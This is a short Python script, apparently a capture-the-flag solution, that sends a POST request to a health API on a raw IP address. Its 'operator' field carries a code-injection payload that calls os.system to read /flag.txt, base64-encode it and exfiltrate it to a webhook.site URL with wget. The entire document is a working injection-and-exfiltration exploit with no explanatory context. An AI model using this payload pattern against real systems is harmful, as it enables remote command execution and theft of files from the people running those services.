import requests as r

URL = "http://161.35.36.157:30180/api/get_health"

data = {
    "current_health": 1337,
    "operator": "; __import__('os').system('wget https://webhook.site/fd4b0bc7-0246-40e5-abd3-3b550efd5455/`cat /flag.txt | base64`') #",
    "attack_power": 69
}

req = r.post(URL, json=data)
print(req.text)
